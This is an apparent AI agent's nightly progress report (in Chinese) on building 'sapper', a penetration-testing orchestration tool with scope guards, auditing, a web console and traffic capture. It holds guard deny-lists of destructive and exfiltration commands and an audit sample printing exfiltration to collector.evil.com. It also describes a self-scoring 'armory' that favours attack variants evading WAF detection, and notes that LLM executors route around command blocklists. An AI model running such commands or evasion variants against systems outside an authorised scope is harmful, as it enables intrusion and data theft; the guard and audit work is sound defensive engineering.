# 夜间进度报告

生成时间：2026-11-15 01:45
分支：`p1-store` · 标签：`p0-kernel` → `p1-console`

---

## 一句话

P0（事件总线）和 P1（SQLite 索引 + Web 控制台）都已完成并推送。明天你只需要跑一条命令就能在浏览器里看到图。

## 现在就能用

```bash
cd D:\sapper-v2\demo
sapper serve --rebuild
```

浏览器打开 http://127.0.0.1:8787

看到的界面：

```
┌──────────────────────────────────────────────┬──────────────┐
│  sapper 控制台                                │  事件流       │
│  facts 5  intents 3  open 2  seq 12          │  01:44:12     │
│                                              │  fact.created │
│        ● 边界主机                             │  01:44:30     │
│         ╲                                    │  intent.done  │
│          ■ 子网扫描                           │              │
│         ╱                                    │              │
│        ● 服务清单                             │              │
│                                              │              │
│  [图例] host service vuln cred loot flag     │              │
└──────────────────────────────────────────────┴──────────────┘
```

- 圆点 = fact（按 kind 着色）
- 方块 = intent（灰色 open / 绿色 done）
- 连线 = `from` / `to` 关系
- 右侧事件流每 2 秒自动刷新
- 鼠标悬停看详情，可以拖动节点

## 实测证据

```
$ curl /api/health
{"ok": true, "stats": {"facts": 4, "intents": 1, "open": 0, "done": 1,
                       "kinds": {"host":1,"service":1,"vuln":1,"note":1}}, "seq": 0}

# CLI 再加一个 fact 后
$ curl /api/health
{"ok": true, "stats": {"facts": 5, ..., "kinds": {...,"cred":1}}, "seq": 1}

$ curl /api/events?since=0
{"events": [{"seq":1, "event":"fact.created", ...}]}
```

**CLI 与 Web 是同一份数据**，且不需要重启服务——CLI 写文件时同步更新索引，前端轮询即可看到。

---

## 架构决策：为什么索引只是"派生"

关键取舍：**JSON 文件仍是唯一权威源，SQLite 是只读派生索引。**

```
CLI 写 JSON ──► 事件总线 ──► SQLite 索引 ──► HTTP API ──► 浏览器
                  │
                  └─ 失败也不影响主流程
```

好处：
- 索引删了、坏了、版本不兼容了，`sapper` 命令照常跑
- 不需要迁移，不需要双写一致性的复杂逻辑
- Web 服务挂掉不影响正在跑的作战
- 以后要换 PostgreSQL 或多人协作，只需要换索引层

代价：
- 索引数据可能落后于 JSON（如果 `_index_event` 静默失败）
- 用 `sapper serve --rebuild` 可以随时全量重建

## 新增文件

| 文件 | 行数 | 作用 |
|---|---|---|
| `lib/bus.py` | 120 | 事件总线（P0）|
| `lib/index_db.py` | 260 | SQLite 索引层 |
| `lib/server.py` | 165 | HTTP 服务 |
| `web/index.html` | 260 | 前端单页 |
| `PLAN.md` | 120 | 演进计划 |

对上游代码的改动：`lib/sapper.py` 净增约 60 行（辅助函数 + 7 个发射点 + serve 子命令），**没有修改任何现有逻辑**。

## API 一览

| 端点 | 返回 |
|---|---|
| `GET /api/health` | 存活 + 统计 + 当前 seq |
| `GET /api/graph` | 全部 facts + intents + stats |
| `GET /api/events?since=N` | 增量事件（轮询用）|
| `GET /api/fact/<id>` | 单个 fact |
| `GET /api/intent/<id>` | 单个 intent |

## 回滚

```bash
git checkout p0-kernel     # 只有事件总线，没有 Web
git checkout fa8b4e3       # 只有 Windows 适配
git checkout 7b75e6f       # 上游原版
```

## 回归测试（20 项，连续两次全通过）

`python tests/regress.py` —— 不依赖 pytest，也不依赖 fcntl，通过 `bin/sapper_win.py` 驱动，Windows 和 Linux 都能跑。

| 套件 | 项数 | 覆盖 |
|---|---|---|
| **cli** | 4 | setup 结构、fact→claim→done 链路、只读命令、非法 kind 拒绝 |
| **guard** | 10 | 私有放行、公网 ask、越界 deny、`--force-guard`、`--no-guard`、破坏性、外传补确认位、子域边界、文件名不误判、scope 损坏降级 |
| **index** | 3 | 缺失可用、损坏可用、建索引后增量同步 |
| **audit** | 2 | 识别越界并落 fact、干净日志不告警 |
| **serve** | 1 | 只读模式 POST 返回 403 |

```
==================================================
20/20 通过
```

### 测试发现并修掉的两个真实缺陷

1. **`guard` 无 scope 时一律 ask** —— 与设计文档（"未设置范围只提示不拦截"）不符，新用户每个 intent 都会被挡。改为：私有网段放行，公网才 ask。
2. **`serve` 遇到损坏索引直接 500** —— 原来只在"索引不存在"时重建。改为启动时探测可用性，损坏则删掉重建。

### 审查结论

对上游 `lib/sapper.py` 的改动是 `+289 / -7`，那 7 行删除**全部是 `return` 语句**（移到文件锁之外执行 emit）。原有逻辑一行未删。

## 已知问题

1. **前端没做视觉验证**——我这边没有浏览器，只验证了 HTML 返回 200 和 API 数据正确。D3 渲染效果需要你打开看一眼。**这是唯一没有自动化覆盖的部分。**
2. **`sapper serve` 是阻塞进程**——按 Ctrl+C 停止。要做成后台服务需要额外处理 Windows 信号，留给 P4。
3. **索引不记录 rebuild 之前的历史事件**——`--rebuild` 只导数据不导事件，所以事件流从 seq 0 开始是空的，之后的新事件才出现。这是有意的（避免伪造历史）。
4. **上游 `tests/test_sapper.py` 在 Windows 上跑不了**——它直接 `import sapper`，而 sapper 顶部 `import fcntl`。`tests/regress.py` 是为了绕开这个限制写的替代品。

## P2 已完成（追加）

原计划的「待决策」已经落地，方案是 **A + 事后审计**。

### 三道检查（`lib/guard.py`）

| 检查 | 触发 | 动作 |
|---|---|---|
| **scope** | 目标 IP/CIDR/域名不在 `.sapper/scope.json` 内 | deny |
| **destructive** | `rm -rf /`、`mkfs`、`DROP TABLE`、fork bomb | deny |
| **exfil** | `curl -d @`、`nc -e`、`scp @`、`ssh < file` | ask |

9 个用例全通过（范围内/越界 IP/子域匹配/越界域名/破坏/删库/外传/反弹 shell/正常）。

### 用法

```bash
sapper scope add 10.0.0.0/24        # 声明授权范围
sapper scope add example.com
sapper scope                        # 查看

sapper dispatch i001               # 派发前自动检查
sapper dispatch i001 --force-guard # 明知有风险，仍要派发
sapper dispatch i001 --no-guard    # 完全跳过检查

sapper confirm i001                # 批准被 ask 的任务

sapper audit --file runs/x.log --record   # 事后扫描
```

### Web 端审批

`sapper serve --allow-write` 启动后，鼠标悬停在待审批的 intent 上会出现「批准派发」按钮：

```
┌─────────────────────────────┐
│ i002 · intent · open        │
│ 把结果发到收集端             │
│ [ 批准派发 ]                 │
└─────────────────────────────┘
```

点击后 `POST /api/confirm/i002` → 写 JSON → 更新索引 → 事件流出现 `intent.confirmed`。

**没有 `--allow-write` 时整个服务是只读的**，这是 P1 的承诺，P2 没有破坏它。

### 为什么不做命令级拦截

executor 是容器里的 claude CLI，它自己执行命令。拦截要改镜像、加 wrapper、每次往返宿主机确认——8 小时无人值守会直接废掉。

更关键的是：**规则追不上 LLM**。你拦 `rm -rf`，它改 `find -delete`；你拦 `find`，它改 `python -c shutil.rmtree`。

所以改为守「意图」：LLM 能改命令，改不了它自己声明的目标列表。范围检查是唯一真正防住法律风险的一环，而这一环只有意图层做得到。

### 事后审计（`lib/audit.py`）

```
$ sapper audit --file fake.log --record
audit: fake.log 发现 3 项可疑
  [deny] curl -d @/tmp/dump.sql http://collector.evil.com/up
      - 目标越界: collector.evil.com
      - exfil: curl -d
  [deny] ssh root@8.8.8.8 < /etc/passwd
      - 目标越界: 8.8.8.8
  [deny] (整体文本)
recorded as f002
```

支持三种 transcript 格式：`$ cmd`、`[bash] cmd`、`● Bash(cmd)`。

## P3 已完成：自评分武器库

这是你最初提的「自进化工具库」。

### 数据模型

一个武器 = 一个手法 + **多个变体**。变体是同一攻击的不同表达，针对不同防御：

```
w002  SQL 注入联合查询探测  [web/sqli]
  v1  conf=0.50  sig=4   sqlmap 默认 UA 与 payload
  v2  conf=0.20  sig=0   随机 UA + tamper + 限速      [已弃用]
  v3  conf=0.75  sig=0   手工布尔盲注，单请求验证
```

`sig` 是该变体的**检测特征**（会被 WAF 认出来的字符串）。sig 越少越隐蔽。

### 自进化闭环

```
sapper done i001 --fact "注入成功" --weapon w002 --vid v3 --result ok
  → intent 收尾 + 武器记分，一步完成
```

评分用拉普拉斯平滑 `(ok+1)/(tries+2)`：

| 事件 | 置信度变化 |
|---|---|
| 初始 | 0.50（无信息）|
| 成功 1 次 | 0.67 |
| 成功 2 次 | 0.75 |
| 被拦 1 次 | 0.33 |
| 被拦 3 次 | 0.20 → **自动弃用** |

下次 `sapper armory use w002` 会自动跳过弃用的 v2，选 conf 最高的 v3。

### 命令

```bash
sapper armory seed                          # 导入 4 个种子武器
sapper armory list [--family web/sqli]
sapper armory search tomcat
sapper armory show w002
sapper armory use w002 --lean               # --lean 优先零特征变体
sapper armory add --name "..." --family ... --variant "v1:描述:命令"
sapper armory report w002 --vid v2 --result blocked
```

武器库在 `~/.sapper/armory`（跨项目共享），可用 `SAPPER_ARMORY_ROOT` 覆盖。

### 种子武器（kb/armory/）

| id | 手法 | 变体对比 |
|---|---|---|
| w001 | Tomcat Ghostcat | ajpShooter 原始 / 自组 AJP 帧分片 |
| w002 | SQL 注入 | sqlmap 默认 / 随机UA+tamper+限速 / 手工盲注 |
| w003 | 目录枚举 | gobuster 50线程 / ffuf 20rps / 只打已知路径 |
| w004 | SSRF | 127.0.0.1 / 整数与八进制 IP / DNS 重绑定 |

每个变体都标注了它的检测特征，这是"去特征"的可量化基础。

### 还没做的

**变体自动生成**：现在被拦三次只是标记弃用，不会自动生成新变体。要让 LLM 根据"被什么拦了"来变异（比如从 w002/v2 的被拦记录推出该换什么编码），需要 P4 里加一个 `intent.confirmation_required` 之外的触发点。

## P4 已完成：全局资产图（双图架构）

sapper 原来的图是**一次性的**：打完一场就结束，下次同一家公司从头再来。P4 在它下面加了一层
耐久资产库，形态就是 ARTEX 的「双图」——但只用了 300 行，没动 Go、没动前端框架。

```
~/.sapper/assets.db          ← 跨任务资产库（SQLite，全局）
<项目>/.sapper/              ← 任务事实图（JSON，一次性的）
        │
        └─ fact 写入 → 事件 → 自动投影成资产（ip/domain/service/vuln/cred/loot/endpoint）
```

三个设计取舍：

| 取舍 | 理由 |
|---|---|
| 资产是**派生**的，不是手工维护的 | 写 fact 时自动 upsert，不需要额外操作；`assets rebuild --from <dir>` 可随时回灌 |
| 主机资产只吸收主机字段 | 否则一条 cred fact 会把 `user=admin` 写到 host 上，之后每个任务都继承这个假事实 |
| 继承产生的是 **fact 而非 intent** | 继承值是「待复核线索」，不是已验证结论；描述里写明历史观察次数与时间 |

关键守卫：`seed` 幂等。已有 `data.asset_key` 的资产不会重复继承，所以再跑一次只会补新增部分。

### 命令

```bash
sapper assets                       # 列出（按最近观察倒序）
sapper assets stats                 # 按类型统计 + 库路径
sapper assets search example.com    # 关键词搜索（key/value/label）
sapper assets show ip:10.0.0.5      # 单条详情（含来源 fact 列表）
sapper assets seed --match 10.0.0 --dry-run   # 预览要继承什么
sapper assets seed --match 10.0.0              # 继承到当前图
sapper assets rebuild --from D://old-task       # 从历史项目回灌
sapper assets forget ip:10.0.0.5 --all         # 删除单条 / 清空
```

### Web

控制台顶部加了「任务图 / 资产图」切换。资产图用节点大小表示观察次数（`seen`），
边是父子关系（host → service/vuln/cred），悬停看 data 与最近观察时间。
新增接口：`GET /api/assets`、`GET /api/asset/<key>`。

### 实测

```
写入 4 条 fact（host/service/vuln/cred） -> assets: 4（note 不入库）
ip:10.0.0.5 的 data = {host, port}       -> 未被 cred 的 user 污染
新任务 seed --match 10.0.0               -> 继承 3 项，标题为资产值
再跑一次                                  -> 匹配 3 项，但都已在当前图中（跳过）
edges: ip -> {service, vuln, cred}        -> 父子关系正确
```

---

## 下一步（P5）

| 期 | 内容 | 预计 |
|---|---|---|
| **P5** | MITM 流量录制（mitmproxy addon + traffic 表 + 前端流量页）| 4 小时 |

P5 的三个硬点（已在 PLAN 里记过）：CA 信任、证书固定（pinning 的目标录不到）、
流量必须先过滤再入库（否则一张表三天就爆）。

---

## P5 已完成：MITM 流量录制

代理录制最大的坑不是抓不到，是**抓太多**：一个站点几万请求，直接入库三天就成垃圾场。
所以过滤跑在入库之前，规则只有一张表：

| 保留 | 丢弃 |
|---|---|
| POST/PUT/PATCH/DELETE（改状态）| `.css/.js/.png/.woff…` 静态资源 |
| 401/403/500/502/503（错误面）| 304 未修改 |
| 路径含 login/admin/api/graphql/.git/.env… | 其他 4xx 以外的不感兴趣响应 |
| URL 含 `id= url= file= cmd= redirect=…` | |
| 2xx/3xx 且 content-type 是 html/json/xml/text | |

**存储独立成 `.sapper/traffic.db`**，不放进 `index.db`：重建事实索引不能顺手把证据删了。

### 用法

```bash
# 抓包（需要 mitmproxy：pip install mitmproxy）
mitmdump -p 8080 -s tools/mitm_sapper.py --set sapper_store=D:/work/target

# 查询
sapper traffic                     # 最近 100 条
sapper traffic list --status 403
sapper traffic list --host example.com
sapper traffic search token
sapper traffic show 12             # 完整请求/响应（body 截断 8KB）
sapper traffic stats
sapper traffic clear --all         # 必须显式 --all
sapper traffic import --file flows.json   # 没有 mitmproxy 也能进（JSON 数组）
```

Web 控制台第三个页签「流量」：状态码着色（2xx 绿 / 3xx 蓝 / 4xx·5xx 红），
点行看完整请求响应。接口：`GET /api/traffic`、`GET /api/traffic/<id>`。

### 实测

```
9 条混合流量 import -> 6 kept, 3 dropped (static×2, not-modified×1)
POST /login         -> [state-changing]
/admin 403          -> [error-surface]
/api/user?id=1      -> [hot-path]
README 之外的硬限制：证书固定(pinning)的目标抓不到明文，这是 TLS 本身的性质，不是工具问题。
```

---

## P6 已完成：控制台从"只读"变成"能干活"

ARTEX 的控制台能建任务、改发现、管流量、编辑工作空间、和 agent 对话。我们此前只有一张图和
一个确认按钮——不是缺页面，是缺**写接口**。P6 把写路径补齐：

| 能力 | 接口 | UI |
|---|---|---|
| 建事实 | `POST /api/ops/fact` | ＋事实 表单（kind + data kv） |
| 建意图 | `POST /api/ops/intent` | ＋意图 表单（多选来源 fact、需批准勾选） |
| 认领/释放 | `POST /api/ops/claim|release/<id>` | intent 详情里的按钮 |
| 完成并写产出 | `POST /api/ops/done/<id>` | 「完成…」内联表单 |
| 批准 | `POST /api/confirm/<id>` | intent 详情里的「批准」 |
| 派发执行 | `POST /api/ops/dispatch/<id>` | 「派发执行」+ 实时日志窗 + 停止 |
| 搜索 | `GET /api/search?q=` | 顶部搜索，按 事实/意图/资产/流量 分组 |

关键实现约束：**所有写操作都走 Store 的原方法**（`_ConsoleOps` 里只是转发），
所以 guard、事件、索引、资产沉淀与 CLI 完全同一条路径——Web 不可能绕开守卫写图。

`sapper serve` 默认仍是只读；只有 `--allow-write` 才注册 ops，且只读模式下
`/api/ops/*` 一律 403（有回归覆盖）。

### 真机验证（Chrome）

```
建 fact      -> 落盘 f011, creator=web, data.host=10.9.9.9
意图表单     -> 来源 fact 已预选 f002
搜索 nginx   -> 事实 2 条（f002 service / f003 vuln），点击定位到节点
派发 i002    -> 真实执行：11 facts、7 个 service、i002 done
日志窗       -> executor 输出实时回显
```

派发那次顺带证明了机制有效：模型发现 nmap 不存在后自行回退到 Python socket 扫描，
并用 netstat 交叉核对 19 个端口，最后指出 `f001` 记录的 os=linux 与实测 Windows 不符。

---

## P7 已完成：前端模块化 + 资产图交互

原来 `index.html` 是 900 行单文件：样式、HTTP、四个视图、表单全在一个 `<script>` 里，
加一个视图就要改同一个文件、碰同一份状态。ARTEX 是组件化的，这一块确实差得远。

### 拆成无构建的 ES 模块

| 文件 | 职责 | 行数 |
|---|---|---|
| `web/index.html` | 只有结构 | ~90 |
| `web/css/app.css` | 全部样式 | ~230 |
| `web/js/api.js` | 每个 HTTP 端点一个函数 | ~40 |
| `web/js/store.js` | 共享状态 + 事件总线 | ~30 |
| `web/js/graph.js` | 通用力导向渲染器（缩放/拖拽/选中/聚焦/布局） | ~230 |
| `web/js/taskgraph.js` | 任务图节点、详情、三个表单、派发日志 | ~250 |
| `web/js/assets.js` | 资产图的筛选/聚焦/布局/抽屉/操作 | ~200 |
| `web/js/traffic.js` | 流量表与详情 | ~60 |
| `web/js/chat.js` | 对话 | ~100 |
| `web/js/search.js` | 全局搜索 | ~80 |
| `web/js/main.js` | 路由、模式切换、轮询、事件接线 | ~230 |

没有打包、没有 node_modules——浏览器原生 `type="module"`，仍然是零依赖。

关键收益：`graph.js` 成为通用渲染器，任务图和资产图共用同一套缩放/拖拽/选中/聚焦；
新增视图只需加一个模块 + 一个 tab，不用碰其它文件。

### 资产图交互（对齐 ARTEX 资产页）

- 类型 chips：全部 / ip / domain / service / vuln / cred / loot / endpoint，带实时计数，可多选
- 关键字过滤（key / value / label / data 都匹配）
- 布局切换：力导向 ↔ 按类型分组（列布局），切换后自动适配视野
- 点节点：选中环 + 自动居中 + 邻居聚焦（非邻居淡出到 18%）
- 双击放大；背景点击取消选择；滚轮缩放、拖拽
- 抽屉：字段表、父级跳转、来源 fact 时间线，以及
  **继承到当前图 / 聚焦邻居 / 复制 key / 删除**
- hover 提示恢复（重构时丢过一次，已补）

### 过程中修掉的三个真实问题

1. **8 秒轮询重建 chips，点击全部失效** —— 改为原地更新计数/选中态
2. **工具栏浮在画布上压住节点** —— 移出画布成为独立一行，`#wrap` 高度联动
3. **节点飞散/压字** —— 标签截 16 字，加 x/y 引力（0.06）防止不连通子图漂到角落

---

## S1 已完成：控制台的认证、授权与审计

之前 `sapper serve` 没有任何认证——同机任何一个进程扫到端口就能调 `/api/ops/dispatch`，
那等价于远程代码执行。这一轮按"敌方在隔壁"的假设重做。

### 三个开关，不是一个

| 启动 | 能力 | 被拿走后最坏结果 |
|---|---|---|
| `sapper serve` | 只看 | 情报泄露（本机） |
| `+ --allow-write` | 改图、批准、对话 | 事实图被写脏（可回滚） |
| `+ --allow-exec` | 派发/停止 executor | **代码执行**（不可回滚） |

**写图和执行拆成两个开关**是这轮最重要的决定：写会话被 CSRF 或同机进程拿走后，
拿不到代码执行。`/api/health` 如实上报 `{"write":..,"exec":..}`，前端据此禁用按钮。

### 认证

启动时打印唯一入口：

```
console : http://127.0.0.1:8787/?t=<32字节随机token>
```

- 该 URL 下发 `HttpOnly; SameSite=Strict` Cookie，302 到 `/`
- 之后所有请求（含静态资源、SSE）都要 Cookie 或 `Authorization: Bearer`
- token 只在内存里，重启即失效；无 token 访问 `/` 只返回一张"需要令牌"的提示页，**不设 Cookie**

### 威胁与控制

| 威胁 | 控制 | 测试 |
|---|---|---|
| 同机 agent 扫端口 | 会话令牌 | 无令牌 → 401 |
| CSRF | SameSite=Strict + 必须 JSON + `X-Sapper-Request: 1`（表单无法设置） | 缺头 → 403 |
| DNS rebinding | Host 白名单 + 端口校验 | `Host: evil.example.com` → 421 |
| 跨站读取/提交 | `Origin` / `Sec-Fetch-Site` 校验 | cross-site → 403 |
| 越权执行 | `--allow-exec` 独立开关 | 写会话派发 → 403 |
| 请求体炸内存 | 1 MiB 上限 | → 413 |
| 点击劫持 | `X-Frame-Options: DENY` + CSP `frame-ancestors 'none'` | 响应头 |
| 审计被抹 | `.sapper/audit.jsonl` 哈希链（prev+hash） | 断言链首 prev="" 且含 fact/intent/done |
| 供应链 | d3 本地、CSP `script-src 'self'` | 静态资源断言 |

### 实时

`GET /api/stream?since=N` 用 SSE 推送事件，`/api/events` 保留为轮询降级。
实测：CLI 写入一条 fact，页面 seq 21→22→23，事件流与图自动更新，无需刷新。

### 完整设计

见 `DESIGN-WEB.md`：能力分级、威胁模型（含残余风险）、接口契约、状态码语义、
前端交互规范与 S2–S4 路线。

---

## P8 已完成：武器库进控制台（自进化闭环可视化）

武器库此前只有 CLI：看不到置信度，也不知道哪些变体已经被拦到弃用。这轮把它搬进 Web。

### 界面

`武器库` 页签（第 4 个）：每张卡是一把武器，每行是一个变体。

```
w002  SQL 联合查询探测  [web/sqli]        5 次 · 成功 2 · 被拦 3
 v1  sqlmap 默认 UA 与 payload   ▓▓▓▓▓▓▓░ 0.67   1/1 · 败0   [用][成功][被拦][失败]
 v2弃 随机 UA + tamper + 限速    ▓▓░░░░░░ 0.20   3/0 · 败3   [用][成功][被拦][失败]
 v3  手工布尔盲注，单请求验证    ▓▓▓▓▓▓▓░ 0.67   1/1 · 败0   [用][成功][被拦][失败]
 最优 v3  [用最优变体]
```

- **置信度条 + 折线**：`history` 记录最近 24 次结果，图上能看到曲线，而不只是一个数字
- **一键记分**：成功 / 被拦 / 失败 → `POST /api/ops/armory {action:report}`
- **自动弃用**：连续 3 次失败变灰并标 `弃`，`用最优变体` 会自动跳过
- **取命令**：`用` 返回该变体的具体命令，可一键复制
- **新建武器**：内置表单，写入 `~/.sapper/armory/wNNN.json`
- **搜索 / 家族筛选**：按名称、变体描述、命令全文匹配

### 闭环打通到任务流

完成意图时可以顺手记分：

```
intent 详情 →「完成…」→ 产出事实 + [武器][变体][结果]
```

服务端在**写图之前**校验武器/变体是否存在——写错变体不会留下"意图已关但没记分"的脏状态（有测试）。

实测：`sapper done` 路径等价，`i005 + w002/v3 + ok` → f016 写入，v3 置信度 0.67。

### 接口

```
GET  /api/armory            列表（首次访问自动 seed 种子武器）
GET  /api/armory/<id>       单个武器
POST /api/ops/armory        {action: use|report|add|seed, weapon, vid, result}
```

全部走 `_ConsoleOps` → `Armory` 原方法，与 CLI 同一套评分逻辑；写操作进审计链。

---

## 容器内验证（追加）

```
==== regression inside sapper-agent:latest (Linux + Python 3.14) ====
28/28 通过
```

同一套 `tests/regress.py` 在容器里跑通，说明两条路径都成立：
Windows 走 `bin/sapper_win.py` 的 fcntl 模拟层，Linux 走真 `fcntl.flock` + Kali 的 Python 3.14。
（P4 之后容器内的项数变为 31，本机已验；容器下次重跑可复核。）
